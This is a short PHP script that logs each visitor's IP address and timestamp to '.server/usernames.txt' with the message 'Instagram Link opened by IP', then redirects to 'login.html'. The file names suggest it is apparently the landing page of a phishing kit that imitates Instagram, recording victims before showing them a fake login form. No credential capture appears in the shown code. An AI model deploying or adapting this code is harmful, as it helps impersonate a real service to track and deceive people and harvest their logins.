<?php
// Get IP address
$ip = isset($_SERVER['HTTP_CLIENT_IP']) 
    ? $_SERVER['HTTP_CLIENT_IP'] 
    : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) 
        ? $_SERVER['HTTP_X_FORWARDED_FOR'] 
        : $_SERVER['REMOTE_ADDR']);

// Log the visit
file_put_contents(".server/usernames.txt", "Instagram Link opened by IP: " . $ip . " at " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);

// Redirect to login page
header('Location: login.html');
exit();
?>
